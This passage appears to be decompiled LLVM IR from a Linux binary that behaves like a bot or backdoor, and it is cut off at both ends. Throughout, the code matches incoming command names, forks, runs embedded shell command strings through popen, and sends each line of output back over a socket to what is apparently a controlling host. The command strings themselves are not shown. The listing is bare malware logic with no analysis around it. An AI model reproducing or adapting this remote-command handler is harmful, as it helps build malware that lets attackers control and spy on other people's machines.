  %v1_80555c5 = icmp eq i1 %v1_80555c3, false
  br i1 %v1_80555c5, label %dec_label_pc_80562ce, label %dec_label_pc_80555cb

dec_label_pc_80555cb:                             ; preds = %dec_label_pc_80555b8
  %v2_80555db = ptrtoint i32* %stack_var_-2168 to i32
  %v4_80555e4 = bitcast i32* %stack_var_-2168 to i8*
  %v5_80555e4 = call i32 @__GI_memset(i8* %v4_80555e4, i32 0, i32 1024)
  %v3_8055604 = call i32 @sprintf(i32 %v2_80555db, i32 ptrtoint ([69 x i8]* @global_var_806c940.516 to i32))
  store i32 %v2_80555db, i32* @eax, align 4
  %v4_805561a = call i32 @popen(i32 %v2_80555db, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @global_var_8069c83.83, i32 0, i32 0))
  %v1_8055695 = inttoptr i32 %v4_805561a to i16*
  %v2_8055695165 = call i32 @feof(i16* %v1_8055695)
  %v1_805569a166 = icmp eq i32 %v2_8055695165, 0
  br i1 %v1_805569a166, label %dec_label_pc_8055624, label %dec_label_pc_805569e

dec_label_pc_8055624:                             ; preds = %dec_label_pc_80555cb, %dec_label_pc_8055624
  %v5_805563d = call i32 @__GI_memset(i8* %v4_80555e4, i32 0, i32 1024)
  %v4_805565a = call i32 @fgets(i32 %v2_80555db, i32 1024, i32 %v4_805561a)
  %v3_805567e = call i32 @Send(i32 %arg1, i32 ptrtoint ([15 x i8]* @global_var_806c985.517 to i32))
  %v1_805568a = call i32 @sleep(i32 1)
  %v2_8055695 = call i32 @feof(i16* %v1_8055695)
  %v1_805569a = icmp eq i32 %v2_8055695, 0
  br i1 %v1_805569a, label %dec_label_pc_8055624, label %dec_label_pc_805569e

dec_label_pc_805569e:                             ; preds = %dec_label_pc_8055624, %dec_label_pc_80555cb
  %v1_80556a4 = call i32 @pclose(i32 %v4_805561a)
  %v1_80556b0 = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_80556b5

dec_label_pc_80556b5:                             ; preds = %dec_label_pc_8055595, %dec_label_pc_805569e
  store i32 %v1_805552e, i32* @eax, align 4
  %v5_80556cb = call i32 @__GI_strncmp(i8* %v5_805552f, i32 ptrtoint ([5 x i8]* @global_var_806c994.518 to i32), i32 4)
  %v1_80556d0 = icmp eq i32 %v5_80556cb, 0
  %v1_80556d2 = icmp eq i1 %v1_80556d0, false
  br i1 %v1_80556d2, label %dec_label_pc_80557d5, label %dec_label_pc_80556d8

dec_label_pc_80556d8:                             ; preds = %dec_label_pc_80556b5
  %v1_80556de = call i32 @mfork(i32 %v4_80553bf)
  %v1_80556e3 = icmp eq i32 %v1_80556de, 0
  %v1_80556e5 = icmp eq i1 %v1_80556e3, false
  br i1 %v1_80556e5, label %dec_label_pc_80562ce, label %dec_label_pc_80556eb

dec_label_pc_80556eb:                             ; preds = %dec_label_pc_80556d8
  %v2_80556fb = ptrtoint i32* %stack_var_-2168 to i32
  %v4_8055704 = bitcast i32* %stack_var_-2168 to i8*
  %v5_8055704 = call i32 @__GI_memset(i8* %v4_8055704, i32 0, i32 1024)
  %v3_8055724 = call i32 @sprintf(i32 %v2_80556fb, i32 ptrtoint ([100 x i8]* @global_var_806c99c.519 to i32))
  store i32 %v2_80556fb, i32* @eax, align 4
  %v4_805573a = call i32 @popen(i32 %v2_80556fb, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @global_var_8069c83.83, i32 0, i32 0))
  %v1_80557b5 = inttoptr i32 %v4_805573a to i16*
  %v2_80557b5162 = call i32 @feof(i16* %v1_80557b5)
  %v1_80557ba163 = icmp eq i32 %v2_80557b5162, 0
  br i1 %v1_80557ba163, label %dec_label_pc_8055744, label %dec_label_pc_80557be

dec_label_pc_8055744:                             ; preds = %dec_label_pc_80556eb, %dec_label_pc_8055744
  %v5_805575d = call i32 @__GI_memset(i8* %v4_8055704, i32 0, i32 1024)
  %v4_805577a = call i32 @fgets(i32 %v2_80556fb, i32 1024, i32 %v4_805573a)
  %v3_805579e = call i32 @Send(i32 %arg1, i32 ptrtoint ([15 x i8]* @global_var_806c985.517 to i32))
  %v1_80557aa = call i32 @sleep(i32 1)
  %v2_80557b5 = call i32 @feof(i16* %v1_80557b5)
  %v1_80557ba = icmp eq i32 %v2_80557b5, 0
  br i1 %v1_80557ba, label %dec_label_pc_8055744, label %dec_label_pc_80557be

dec_label_pc_80557be:                             ; preds = %dec_label_pc_8055744, %dec_label_pc_80556eb
  %v1_80557c4 = call i32 @pclose(i32 %v4_805573a)
  %v1_80557d0 = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_80557d5

dec_label_pc_80557d5:                             ; preds = %dec_label_pc_80556b5, %dec_label_pc_80557be
  store i32 %v1_805552e, i32* @eax, align 4
  %v5_80557eb = call i32 @__GI_strncmp(i8* %v5_805552f, i32 ptrtoint ([7 x i8]* @global_var_806ca00.520 to i32), i32 6)
  %v1_80557f0 = icmp eq i32 %v5_80557eb, 0
  %v1_80557f2 = icmp eq i1 %v1_80557f0, false
  br i1 %v1_80557f2, label %dec_label_pc_80558f5, label %dec_label_pc_80557f8

dec_label_pc_80557f8:                             ; preds = %dec_label_pc_80557d5
  %v1_80557fe = call i32 @mfork(i32 %v4_80553bf)
  %v1_8055803 = icmp eq i32 %v1_80557fe, 0
  %v1_8055805 = icmp eq i1 %v1_8055803, false
  br i1 %v1_8055805, label %dec_label_pc_80562ce, label %dec_label_pc_805580b

dec_label_pc_805580b:                             ; preds = %dec_label_pc_80557f8
  %v2_805581b = ptrtoint i32* %stack_var_-2168 to i32
  %v4_8055824 = bitcast i32* %stack_var_-2168 to i8*
  %v5_8055824 = call i32 @__GI_memset(i8* %v4_8055824, i32 0, i32 1024)
  %v3_8055844 = call i32 @sprintf(i32 %v2_805581b, i32 ptrtoint ([330 x i8]* @global_var_806ca08.521 to i32))
  store i32 %v2_805581b, i32* @eax, align 4
  %v4_805585a = call i32 @popen(i32 %v2_805581b, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @global_var_8069c83.83, i32 0, i32 0))
  %v1_80558d5 = inttoptr i32 %v4_805585a to i16*
  %v2_80558d5159 = call i32 @feof(i16* %v1_80558d5)
  %v1_80558da160 = icmp eq i32 %v2_80558d5159, 0
  br i1 %v1_80558da160, label %dec_label_pc_8055864, label %dec_label_pc_80558de

dec_label_pc_8055864:                             ; preds = %dec_label_pc_805580b, %dec_label_pc_8055864
  %v5_805587d = call i32 @__GI_memset(i8* %v4_8055824, i32 0, i32 1024)
  %v4_805589a = call i32 @fgets(i32 %v2_805581b, i32 1024, i32 %v4_805585a)
  %v3_80558be = call i32 @Send(i32 %arg1, i32 ptrtoint ([15 x i8]* @global_var_806c985.517 to i32))
  %v1_80558ca = call i32 @sleep(i32 1)
  %v2_80558d5 = call i32 @feof(i16* %v1_80558d5)
  %v1_80558da = icmp eq i32 %v2_80558d5, 0
  br i1 %v1_80558da, label %dec_label_pc_8055864, label %dec_label_pc_80558de

dec_label_pc_80558de:                             ; preds = %dec_label_pc_8055864, %dec_label_pc_805580b
  %v1_80558e4 = call i32 @pclose(i32 %v4_805585a)
  %v1_80558f0 = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_80558f5

dec_label_pc_80558f5:                             ; preds = %dec_label_pc_80557d5, %dec_label_pc_80558de
  store i32 %v1_805552e, i32* @eax, align 4
  %v5_805590b = call i32 @__GI_strncmp(i8* %v5_805552f, i32 ptrtoint ([8 x i8]* @global_var_806cb52.522 to i32), i32 7)
  %v1_8055910 = icmp eq i32 %v5_805590b, 0
  %v1_8055912 = icmp eq i1 %v1_8055910, false
  br i1 %v1_8055912, label %dec_label_pc_8055a15, label %dec_label_pc_8055918

dec_label_pc_8055918:                             ; preds = %dec_label_pc_80558f5
  %v1_805591e = call i32 @mfork(i32 %v4_80553bf)
  %v1_8055923 = icmp eq i32 %v1_805591e, 0
  %v1_8055925 = icmp eq i1 %v1_8055923, false
  br i1 %v1_8055925, label %dec_label_pc_80562ce, label %dec_label_pc_805592b

dec_label_pc_805592b:                             ; preds = %dec_label_pc_8055918
  %v2_805593b = ptrtoint i32* %stack_var_-2168 to i32
  %v4_8055944 = bitcast i32* %stack_var_-2168 to i8*
  %v5_8055944 = call i32 @__GI_memset(i8* %v4_8055944, i32 0, i32 1024)
  %v3_8055964 = call i32 @sprintf(i32 %v2_805593b, i32 ptrtoint ([668 x i8]* @global_var_806cb5c.523 to i32))
  store i32 %v2_805593b, i32* @eax, align 4
  %v4_805597a = call i32 @popen(i32 %v2_805593b, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @global_var_8069c83.83, i32 0, i32 0))
  %v1_80559f5 = inttoptr i32 %v4_805597a to i16*
  %v2_80559f5156 = call i32 @feof(i16* %v1_80559f5)
  %v1_80559fa157 = icmp eq i32 %v2_80559f5156, 0
  br i1 %v1_80559fa157, label %dec_label_pc_8055984, label %dec_label_pc_80559fe

dec_label_pc_8055984:                             ; preds = %dec_label_pc_805592b, %dec_label_pc_8055984
  %v5_805599d = call i32 @__GI_memset(i8* %v4_8055944, i32 0, i32 1024)
  %v4_80559ba = call i32 @fgets(i32 %v2_805593b, i32 1024, i32 %v4_805597a)
  %v3_80559de = call i32 @Send(i32 %arg1, i32 ptrtoint ([15 x i8]* @global_var_806c985.517 to i32))
  %v1_80559ea = call i32 @sleep(i32 1)
  %v2_80559f5 = call i32 @feof(i16* %v1_80559f5)
  %v1_80559fa = icmp eq i32 %v2_80559f5, 0
  br i1 %v1_80559fa, label %dec_label_pc_8055984, label %dec_label_pc_80559fe

dec_label_pc_80559fe:                             ; preds = %dec_label_pc_8055984, %dec_label_pc_805592b
  %v1_8055a04 = call i32 @pclose(i32 %v4_805597a)
  %v1_8055a10 = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_8055a15

dec_label_pc_8055a15:                             ; preds = %dec_label_pc_80558f5, %dec_label_pc_80559fe
  store i32 %v1_805552e, i32* @eax, align 4
  %v5_8055a2b = call i32 @__GI_strncmp(i8* %v5_805552f, i32 ptrtoint ([9 x i8]* @global_var_806cdf8.524 to i32), i32 8)
  %v1_8055a30 = icmp eq i32 %v5_8055a2b, 0
  %v1_8055a32 = icmp eq i1 %v1_8055a30, false
  br i1 %v1_8055a32, label %dec_label_pc_8055b35, label %dec_label_pc_8055a38

dec_label_pc_8055a38:                             ; preds = %dec_label_pc_8055a15
  %v1_8055a3e = call i32 @mfork(i32 %v4_80553bf)
  %v1_8055a43 = icmp eq i32 %v1_8055a3e, 0
  %v1_8055a45 = icmp eq i1 %v1_8055a43, false
  br i1 %v1_8055a45, label %dec_label_pc_80562ce, label %dec_label_pc_8055a4b

dec_label_pc_8055a4b:                             ; preds = %dec_label_pc_8055a38
  %v2_8055a5b = ptrtoint i32* %stack_var_-2168 to i32
  %v4_8055a64 = bitcast i32* %stack_var_-2168 to i8*
  %v5_8055a64 = call i32 @__GI_memset(i8* %v4_8055a64, i32 0, i32 1024)
  %v3_8055a84 = call i32 @sprintf(i32 %v2_8055a5b, i32 ptrtoint ([389 x i8]* @global_var_806ce04.525 to i32))
  store i32 %v2_8055a5b, i32* @eax, align 4
  %v4_8055a9a = call i32 @popen(i32 %v2_8055a5b, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @global_var_8069c83.83, i32 0, i32 0))
  %v1_8055b15 = inttoptr i32 %v4_8055a9a to i16*
  %v2_8055b15153 = call i32 @feof(i16* %v1_8055b15)
  %v1_8055b1a154 = icmp eq i32 %v2_8055b15153, 0
  br i1 %v1_8055b1a154, label %dec_label_pc_8055aa4, label %dec_label_pc_8055b1e

dec_label_pc_8055aa4:                             ; preds = %dec_label_pc_8055a4b, %dec_label_pc_8055aa4
  %v5_8055abd = call i32 @__GI_memset(i8* %v4_8055a64, i32 0, i32 1024)
  %v4_8055ada = call i32 @fgets(i32 %v2_8055a5b, i32 1024, i32 %v4_8055a9a)
  %v3_8055afe = call i32 @Send(i32 %arg1, i32 ptrtoint ([15 x i8]* @global_var_806c985.517 to i32))
  %v1_8055b0a = call i32 @sleep(i32 1)
  %v2_8055b15 = call i32 @feof(i16* %v1_8055b15)
  %v1_8055b1a = icmp eq i32 %v2_8055b15, 0
  br i1 %v1_8055b1a, label %dec_label_pc_8055aa4, label %dec_label_pc_8055b1e

dec_label_pc_8055b1e:                             ; preds = %dec_label_pc_8055aa4, %dec_label_pc_8055a4b
  %v1_8055b24 = call i32 @pclose(i32 %v4_8055a9a)
  %v1_8055b30 = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_8055b35

dec_label_pc_8055b35:                             ; preds = %dec_label_pc_8055a15, %dec_label_pc_8055b1e
  store i32 %v1_805552e, i32* @eax, align 4
  %v5_8055b4b = call i32 @__GI_strncmp(i8* %v5_805552f, i32 ptrtoint ([11 x i8]* @global_var_806cf89.526 to i32), i32 10)
  %v1_8055b50 = icmp eq i32 %v5_8055b4b, 0
  %v1_8055b52 = icmp eq i1 %v1_8055b50, false
  br i1 %v1_8055b52, label %dec_label_pc_8055c55, label %dec_label_pc_8055b58

dec_label_pc_8055b58:                             ; preds = %dec_label_pc_8055b35
  %v1_8055b5e = call i32 @mfork(i32 %v4_80553bf)
  %v1_8055b63 = icmp eq i32 %v1_8055b5e, 0
  %v1_8055b65 = icmp eq i1 %v1_8055b63, false
  br i1 %v1_8055b65, label %dec_label_pc_80562ce, label %dec_label_pc_8055b6b

dec_label_pc_8055b6b:                             ; preds = %dec_label_pc_8055b58
  %v2_8055b7b = ptrtoint i32* %stack_var_-2168 to i32
  %v4_8055b84 = bitcast i32* %stack_var_-2168 to i8*
  %v5_8055b84 = call i32 @__GI_memset(i8* %v4_8055b84, i32 0, i32 1024)
  %v3_8055ba4 = call i32 @sprintf(i32 %v2_8055b7b, i32 ptrtoint ([371 x i8]* @global_var_806cf94.527 to i32))
  store i32 %v2_8055b7b, i32* @eax, align 4
  %v4_8055bba = call i32 @popen(i32 %v2_8055b7b, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @global_var_8069c83.83, i32 0, i32 0))
  %v1_8055c35 = inttoptr i32 %v4_8055bba to i16*
  %v2_8055c35150 = call i32 @feof(i16* %v1_8055c35)
  %v1_8055c3a151 = icmp eq i32 %v2_8055c35150, 0
  br i1 %v1_8055c3a151, label %dec_label_pc_8055bc4, label %dec_label_pc_8055c3e

dec_label_pc_8055bc4:                             ; preds = %dec_label_pc_8055b6b, %dec_label_pc_8055bc4
  %v5_8055bdd = call i32 @__GI_memset(i8* %v4_8055b84, i32 0, i32 1024)
  %v4_8055bfa = call i32 @fgets(i32 %v2_8055b7b, i32 1024, i32 %v4_8055bba)
  %v3_8055c1e = call i32 @Send(i32 %arg1, i32 ptrtoint ([15 x i8]* @global_var_806c985.517 to i32))
  %v1_8055c2a = call i32 @sleep(i32 1)
  %v2_8055c35 = call i32 @feof(i16* %v1_8055c35)
  %v1_8055c3a = icmp eq i32 %v2_8055c35, 0
  br i1 %v1_8055c3a, label %dec_label_pc_8055bc4, label %dec_label_pc_8055c3e

dec_label_pc_8055c3e:                             ; preds = %dec_label_pc_8055bc4, %dec_label_pc_8055b6b
  %v1_8055c44 = call i32 @pclose(i32 %v4_8055bba)
  %v1_8055c50 = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_8055c55

dec_label_pc_8055c55:                             ; preds = %dec_label_pc_8055b35, %dec_label_pc_8055c3e
  store i32 %v1_805552e, i32* @eax, align 4
  %v5_8055c6b = call i32 @__GI_strncmp(i8* %v5_805552f, i32 ptrtoint ([8 x i8]* @global_var_806d107.528 to i32), i32 7)
  %v1_8055c70 = icmp eq i32 %v5_8055c6b, 0
  %v1_8055c72 = icmp eq i1 %v1_8055c70, false
  br i1 %v1_8055c72, label %dec_label_pc_8055d75, label %dec_label_pc_8055c78

dec_label_pc_8055c78:                             ; preds = %dec_label_pc_8055c55
  %v1_8055c7e = call i32 @mfork(i32 %v4_80553bf)
  %v1_8055c83 = icmp eq i32 %v1_8055c7e, 0
  %v1_8055c85 = icmp eq i1 %v1_8055c83, false
  br i1 %v1_8055c85, label %dec_label_pc_80562ce, label %dec_label_pc_8055c8b

dec_label_pc_8055c8b:                             ; preds = %dec_label_pc_8055c78
  %v2_8055c9b = ptrtoint i32* %stack_var_-2168 to i32
  %v4_8055ca4 = bitcast i32* %stack_var_-2168 to i8*
  %v5_8055ca4 = call i32 @__GI_memset(i8* %v4_8055ca4, i32 0, i32 1024)
  %v3_8055cc4 = call i32 @sprintf(i32 %v2_8055c9b, i32 ptrtoint ([235 x i8]* @global_var_806d110.529 to i32))
  store i32 %v2_8055c9b, i32* @eax, align 4
  %v4_8055cda = call i32 @popen(i32 %v2_8055c9b, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @global_var_8069c83.83, i32 0, i32 0))
  %v1_8055d55 = inttoptr i32 %v4_8055cda to i16*
  %v2_8055d55147 = call i32 @feof(i16* %v1_8055d55)
  %v1_8055d5a148 = icmp eq i32 %v2_8055d55147, 0
  br i1 %v1_8055d5a148, label %dec_label_pc_8055ce4, label %dec_label_pc_8055d5e

dec_label_pc_8055ce4:                             ; preds = %dec_label_pc_8055c8b, %dec_label_pc_8055ce4
  %v5_8055cfd = call i32 @__GI_memset(i8* %v4_8055ca4, i32 0, i32 1024)
  %v4_8055d1a = call i32 @fgets(i32 %v2_8055c9b, i32 1024, i32 %v4_8055cda)
  %v3_8055d3e = call i32 @Send(i32 %arg1, i32 ptrtoint ([15 x i8]* @global_var_806c985.517 to i32))
  %v1_8055d4a = call i32 @sleep(i32 1)
  %v2_8055d55 = call i32 @feof(i16* %v1_8055d55)
  %v1_8055d5a = icmp eq i32 %v2_8055d55, 0
  br i1 %v1_8055d5a, label %dec_label_pc_8055ce4, label %dec_label_pc_8055d5e

dec_label_pc_8055d5e:                             ; preds = %dec_label_pc_8055ce4, %dec_label_pc_8055c8b
  %v1_8055d64 = call i32 @pclose(i32 %v4_8055cda)
  %v1_8055d70 = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_8055d75

dec_label_pc_8055d75:                             ; preds = %dec_label_pc_8055c55, %dec_label_pc_8055d5e
  store i32 %v1_805552e, i32* @eax, align 4
  %v5_8055d8b = call i32 @__GI_strncmp(i8* %v5_805552f, i32 ptrtoint ([8 x i8]* @global_var_806d1fb.530 to i32), i32 6)
  %v1_8055d90 = icmp eq i32 %v5_8055d8b, 0
  %v1_8055d92 = icmp eq i1 %v1_8055d90, false
  br i1 %v1_8055d92, label %dec_label_pc_8055e95, label %dec_label_pc_8055d98

dec_label_pc_8055d98:                             ; preds = %dec_label_pc_8055d75
  %v1_8055d9e = call i32 @mfork(i32 %v4_80553bf)
  %v1_8055da3 = icmp eq i32 %v1_8055d9e, 0
  %v1_8055da5 = icmp eq i1 %v1_8055da3, false
  br i1 %v1_8055da5, label %dec_label_pc_80562ce, label %dec_label_pc_8055dab

dec_label_pc_8055dab:                             ; preds = %dec_label_pc_8055d98
  %v2_8055dbb = ptrtoint i32* %stack_var_-2168 to i32
  %v4_8055dc4 = bitcast i32* %stack_var_-2168 to i8*
  %v5_8055dc4 = call i32 @__GI_memset(i8* %v4_8055dc4, i32 0, i32 1024)
  %v3_8055de4 = call i32 @sprintf(i32 %v2_8055dbb, i32 ptrtoint ([114 x i8]* @global_var_806d204.531 to i32))
  store i32 %v2_8055dbb, i32* @eax, align 4
  %v4_8055dfa = call i32 @popen(i32 %v2_8055dbb, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @global_var_8069c83.83, i32 0, i32 0))
  %v1_8055e75 = inttoptr i32 %v4_8055dfa to i16*
  %v2_8055e75144 = call i32 @feof(i16* %v1_8055e75)
  %v1_8055e7a145 = icmp eq i32 %v2_8055e75144, 0
  br i1 %v1_8055e7a145, label %dec_label_pc_8055e04, label %dec_label_pc_8055e7e

dec_label_pc_8055e04:                             ; preds = %dec_label_pc_8055dab, %dec_label_pc_8055e04
  %v5_8055e1d = call i32 @__GI_memset(i8* %v4_8055dc4, i32 0, i32 1024)
  %v4_8055e3a = call i32 @fgets(i32 %v2_8055dbb, i32 1024, i32 %v4_8055dfa)
  %v3_8055e5e = call i32 @Send(i32 %arg1, i32 ptrtoint ([15 x i8]* @global_var_806c985.517 to i32))
  %v1_8055e6a = call i32 @sleep(i32 1)
  %v2_8055e75 = call i32 @feof(i16* %v1_8055e75)
  %v1_8055e7a = icmp eq i32 %v2_8055e75, 0
  br i1 %v1_8055e7a, label %dec_label_pc_8055e04, label %dec_label_pc_8055e7e

dec_label_pc_8055e7e:                             ; preds = %dec_label_pc_8055e04, %dec_label_pc_8055dab
  %v1_8055e84 = call i32 @pclose(i32 %v4_8055dfa)
  %v1_8055e90 = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_8055e95

dec_label_pc_8055e95:                             ; preds = %dec_label_pc_8055d75, %dec_label_pc_8055e7e
  store i32 %v1_805552e, i32* @eax, align 4
  %v5_8055eab = call i32 @__GI_strncmp(i8* %v5_805552f, i32 ptrtoint ([6 x i8]* @global_var_806d276.532 to i32), i32 5)
  %v1_8055eb0 = icmp eq i32 %v5_8055eab, 0
  %v1_8055eb2 = icmp eq i1 %v1_8055eb0, false
  br i1 %v1_8055eb2, label %dec_label_pc_8055fb5, label %dec_label_pc_8055eb8

dec_label_pc_8055eb8:                             ; preds = %dec_label_pc_8055e95
  %v1_8055ebe = call i32 @mfork(i32 %v4_80553bf)
  %v1_8055ec3 = icmp eq i32 %v1_8055ebe, 0
  %v1_8055ec5 = icmp eq i1 %v1_8055ec3, false
  br i1 %v1_8055ec5, label %dec_label_pc_80562ce, label %dec_label_pc_8055ecb

dec_label_pc_8055ecb:                             ; preds = %dec_label_pc_8055eb8
  %v2_8055edb = ptrtoint i32* %stack_var_-2168 to i32
  %v4_8055ee4 = bitcast i32* %stack_var_-2168 to i8*
  %v5_8055ee4 = call i32 @__GI_memset(i8* %v4_8055ee4, i32 0, i32 1024)
  %v3_8055f04 = call i32 @sprintf(i32 %v2_8055edb, i32 ptrtoint ([406 x i8]* @global_var_806d27c.533 to i32))
  store i32 %v2_8055edb, i32* @eax, align 4
  %v4_8055f1a = call i32 @popen(i32 %v2_8055edb, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @global_var_8069c83.83, i32 0, i32 0))
  %v1_8055f95 = inttoptr i32 %v4_8055f1a to i16*
  %v2_8055f95141 = call i32 @feof(i16* %v1_8055f95)
  %v1_8055f9a142 = icmp eq i32 %v2_8055f95141, 0
  br i1 %v1_8055f9a142, label %dec_label_pc_8055f24, label %dec_label_pc_8055f9e

dec_label_pc_8055f24:                             ; preds = %dec_label_pc_8055ecb, %dec_label_pc_8055f24
  %v5_8055f3d = call i32 @__GI_memset(i8* %v4_8055ee4, i32 0, i32 1024)
  %v4_8055f5a = call i32 @fgets(i32 %v2_8055edb, i32 1024, i32 %v4_8055f1a)
  %v3_8055f7e = call i32 @Send(i32 %arg1, i32 ptrtoint ([15 x i8]* @global_var_806c985.517 to i32))
  %v1_8055f8a = call i32 @sleep(i32 1)
  %v2_8055f95 = call i32 @feof(i16* %v1_8055f95)
  %v1_8055f9a = icmp eq i32 %v2_8055f95, 0
  br i1 %v1_8055f9a, label %dec_label_pc_8055f24, label %dec_label_pc_8055f9e

dec_label_pc_8055f9e:                             ; preds = %dec_label_pc_8055f24, %dec_label_pc_8055ecb
  %v1_8055fa4 = call i32 @pclose(i32 %v4_8055f1a)
  %v1_8055fb0 = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_8055fb5

dec_label_pc_8055fb5:                             ; preds = %dec_label_pc_8055e95, %dec_label_pc_8055f9e
  store i32 %v1_805552e, i32* @eax, align 4
  %v5_8055fcb = call i32 @__GI_strncmp(i8* %v5_805552f, i32 ptrtoint ([6 x i8]* @global_var_806d412.534 to i32), i32 5)
  %v1_8055fd0 = icmp eq i32 %v5_8055fcb, 0
  %v1_8055fd2 = icmp eq i1 %v1_8055fd0, false
  br i1 %v1_8055fd2, label %dec_label_pc_80560d5, label %dec_label_pc_8055fd8

dec_label_pc_8055fd8:                             ; preds = %dec_label_pc_8055fb5
  %v1_8055fde = call i32 @mfork(i32 %v4_80553bf)
  %v1_8055fe3 = icmp eq i32 %v1_8055fde, 0
  %v1_8055fe5 = icmp eq i1 %v1_8055fe3, false
  br i1 %v1_8055fe5, label %dec_label_pc_80562ce, label %dec_label_pc_8055feb

dec_label_pc_8055feb:                             ; preds = %dec_label_pc_8055fd8
  %v2_8055ffb = ptrtoint i32* %stack_var_-2168 to i32
  %v4_8056004 = bitcast i32* %stack_var_-2168 to i8*
  %v5_8056004 = call i32 @__GI_memset(i8* %v4_8056004, i32 0, i32 1024)
  %v3_8056024 = call i32 @sprintf(i32 %v2_8055ffb, i32 ptrtoint ([98 x i8]* @global_var_806d418.535 to i32))
  store i32 %v2_8055ffb, i32* @eax, align 4
  %v4_805603a = call i32 @popen(i32 %v2_8055ffb, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @global_var_8069c83.83, i32 0, i32 0))
  %v1_80560b5 = inttoptr i32 %v4_805603a to i16*
  %v2_80560b5138 = call i32 @feof(i16* %v1_80560b5)
  %v1_80560ba139 = icmp eq i32 %v2_80560b5138, 0
  br i1 %v1_80560ba139, label %dec_label_pc_8056044, label %dec_label_pc_80560be

dec_label_pc_8056044:                             ; preds = %dec_label_pc_8055feb, %dec_label_pc_8056044
  %v5_805605d = call i32 @__GI_memset(i8* %v4_8056004, i32 0, i32 1024)
  %v4_805607a = call i32 @fgets(i32 %v2_8055ffb, i32 1024, i32 %v4_805603a)
  %v3_805609e = call i32 @Send(i32 %arg1, i32 ptrtoint ([15 x i8]* @global_var_806c985.517 to i32))
  %v1_80560aa = call i32 @sleep(i32 1)
  %v2_80560b5 = call i32 @feof(i16* %v1_80560b5)
  %v1_80560ba = icmp eq i32 %v2_80560b5, 0
  br i1 %v1_80560ba, label %dec_label_pc_8056044, label %dec_label_pc_80560be

dec_label_pc_80560be:                             ; preds = %dec_label_pc_8056044, %dec_label_pc_8055feb
  %v1_80560c4 = call i32 @pclose(i32 %v4_805603a)
  %v1_80560d0 = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_80560d5

dec_label_pc_80560d5:                             ; preds = %dec_label_pc_8055fb5, %dec_label_pc_80560be
  %v3_80560ec = call i32 @_strlen(i8* %v5_805552f)
  %v5_805612f127 = icmp sgt i32 %v3_80560ec, 0
  br i1 %v5_805612f127, label %dec_label_pc_80560ff, label %dec_label_pc_805614d.preheader

dec_label_pc_80560ff:                             ; preds = %dec_label_pc_80560d5, %dec_label_pc_8056113
  %v4_80560ff131 = phi i32 [ %v5_8056123, %dec_label_pc_8056113 ], [ %v1_805552e, %dec_label_pc_80560d5 ]
  %storemerge7130 = phi i32 [ %v4_8056126, %dec_label_pc_8056113 ], [ 0, %dec_label_pc_80560d5 ]
  %stack_var_-64.0129 = phi i8* [ %v22_8056123, %dec_label_pc_8056113 ], [ %v5_805552f, %dec_label_pc_80560d5 ]
  %v2_8056102 = load i8, i8* %stack_var_-64.0129, align 1
  %v7_8056105 = icmp eq i8 %v2_8056102, 32
  br i1 %v7_8056105, label %dec_label_pc_805614d.preheader, label %dec_label_pc_8056109

dec_label_pc_8056109:                             ; preds = %dec_label_pc_80560ff
  %v2_805610c = load i8, i8* %stack_var_-64.0129, align 1
  %v4_805610f = icmp eq i8 %v2_805610c, 0
  br i1 %v4_805610f, label %dec_label_pc_805614d.preheader, label %dec_label_pc_8056113

dec_label_pc_8056113:                             ; preds = %dec_label_pc_8056109
  store i32 %v4_80560ff131, i32* %edx.global-to-local, align 4
  %v2_8056119 = load i8, i8* %stack_var_-64.0129, align 1
  %v3_8056119 = zext i8 %v2_8056119 to i32
  store i32 %v3_8056119, i32* %edx.global-to-local, align 4
  %v2_805611c = load i32, i32* @ebp, align 4
  %v4_805611c = add nsw i32 %storemerge7130, -1140
  %v5_805611c = add i32 %v4_805611c, %v2_805611c
  %v6_805611c = inttoptr i32 %v5_805611c to i8*
  store i8 %v2_8056119, i8* %v6_805611c, align 1
  %v5_8056123 = add i32 %v4_80560ff131, 1
  %v22_8056123 = inttoptr i32 %v5_8056123 to i8*
  %v4_8056126 = add nuw nsw i32 %storemerge7130, 1
  %v5_805612f = icmp slt i32 %v4_8056126, %v3_80560ec
  br i1 %v5_805612f, label %dec_label_pc_80560ff, label %dec_label_pc_805614d.preheader

dec_label_pc_805614d.preheader:                   ; preds = %dec_label_pc_80560ff, %dec_label_pc_8056109, %dec_label_pc_8056113, %dec_label_pc_80560d5
  %stack_var_-64.0.lcssa = phi i8* [ %v5_805552f, %dec_label_pc_80560d5 ], [ %v22_8056123, %dec_label_pc_8056113 ], [ %stack_var_-64.0129, %dec_label_pc_8056109 ], [ %stack_var_-64.0129, %dec_label_pc_80560ff ]
  %v4_80560ff.lcssa = phi i32 [ %v1_805552e, %dec_label_pc_80560d5 ], [ %v5_8056123, %dec_label_pc_8056113 ], [ %v4_80560ff131, %dec_label_pc_8056109 ], [ %v4_80560ff131, %dec_label_pc_80560ff ]
  br label %dec_label_pc_805614d

dec_label_pc_805613a:                             ; preds = %dec_label_pc_805614d
  %v6_805613d = add i32 %storemerge6, %v4_80560ff.lcssa
  %v1_8056140 = inttoptr i32 %v6_805613d to i8*
  %v2_8056140 = load i8, i8* %v1_8056140, align 1
  %v7_8056143 = icmp eq i8 %v2_8056140, 32
  %v1_8056145 = icmp eq i1 %v7_8056143, false
  br i1 %v1_8056145, label %dec_label_pc_805614a, label %dec_label_pc_8056147

dec_label_pc_8056147:                             ; preds = %dec_label_pc_805613a
  %v4_8056147 = add i32 %stack_var_-60.1, 1
  br label %dec_label_pc_805614a

dec_label_pc_805614a:                             ; preds = %dec_label_pc_805613a, %dec_label_pc_8056147
